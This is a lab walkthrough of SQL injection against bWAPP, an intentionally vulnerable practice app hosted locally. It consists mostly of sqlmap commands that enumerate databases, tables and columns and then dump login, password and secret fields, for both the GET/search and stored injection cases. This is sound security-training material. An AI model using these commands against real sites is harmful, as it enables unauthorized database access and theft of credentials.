# BWAPP SQL injection(GET/Search) - Low difficulty
- manual selection
![image](img/BWAPP_SQLIGetSearch_Command_LOW.png) <br/>

#### SQLMAP on Windows 10
- using sqlmap to get databases
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --cookie="PHPSESSID=bn95i1n9988g4dqlkhkss0i7km; security_level=0" --dbs
```
- focus on bwapp database, get tables
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --cookie="PHPSESSID=bn95i1n9988g4dqlkhkss0i7km; security_level=0" -D bwapp --tables
```
- get columns from table heroes
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --cookie="PHPSESSID=bn95i1n9988g4dqlkhkss0i7km; security_level=0" -D bwapp -T heroes --columns
```
- get login password and secret from heroes table and save to file
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --cookie="PHPSESSID=bn95i1n9988g4dqlkhkss0i7km; security_level=0" -D bwapp -T heroes -C login, password, secret --dump
```
- result:
![image](img/BWAPP_SQLIGetSearch_SQLMAP_result_LOW.png) <br/>

## SQL Injection - Stored

#### manual
![image](img/BWAPP_SQLISTORE_Command_LOW.png) <br/>

![image](img/BWAPP_SQLISTORE_Command_Result_LOW.png)

#### SQLMAP WIN 10
getting database list
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --data="entry=test&blog=add" --cookie="PHPSESSID=rqjh7f860vensfb8mve067vo7v; security=low; security_level=0" --dbs
```
get tables from bwapp
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --data="entry=test&blog=add" --cookie="PHPSESSID=rqjh7f860vensfb8mve067vo7v; security=low; security_level=0" -D bwapp --tables
```
get columns from heroes table
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --data="entry=test&blog=add" --cookie="PHPSESSID=rqjh7f860vensfb8mve067vo7v; security=low; security_level=0" -D bwapp -T heroes --columns
```
get login password and secret 
```
python sqlmap.py -u "http://127.0.0.1/bwapp/bwapp/sqli_1.php?title=Iron" --data="entry=test&blog=add" --cookie="PHPSESSID=rqjh7f860vensfb8mve067vo7v; security=low; security_level=0" -D bwapp -T heroes -C login,password,secret --dump
```